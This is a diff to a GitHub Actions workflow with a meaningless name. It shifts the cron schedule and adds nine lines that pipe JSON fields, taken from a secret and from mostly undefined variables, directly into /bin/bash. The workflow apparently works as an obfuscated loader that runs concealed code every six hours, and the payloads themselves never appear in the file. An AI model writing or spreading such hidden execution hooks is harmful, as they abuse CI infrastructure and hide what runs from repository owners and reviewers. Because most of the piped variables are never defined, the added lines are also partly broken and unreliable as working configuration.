@@ -2,16 +2,24 @@ name: maturehometeam
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '19 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: maturehometeam
         env:
-          usm5: ${{ secrets.usm5 }}
+          sa7069: ${{ secrets.sa7069 }}
         run: |
-          echo $usm5 | jq -r .di9 | /bin/bash
-          echo $i62343 | jq -r .a8 | /bin/bash
+          echo $sa7069 | jq -r .a986 | /bin/bash
+          echo $j478 | jq -r .t69 | /bin/bash
+          echo $xbznn6 | jq -r .qau07 | /bin/bash
+          echo $nxbwz6 | jq -r .hkmt4 | /bin/bash
+          echo $rls9043 | jq -r .tpf30 | /bin/bash
+          echo $gamfp50874 | jq -r .x1504 | /bin/bash
+          echo $k445 | jq -r .qq079 | /bin/bash
+          echo $ffak19 | jq -r .tpatd1504 | /bin/bash
+          echo $xq86 | jq -r .lh82 | /bin/bash
 
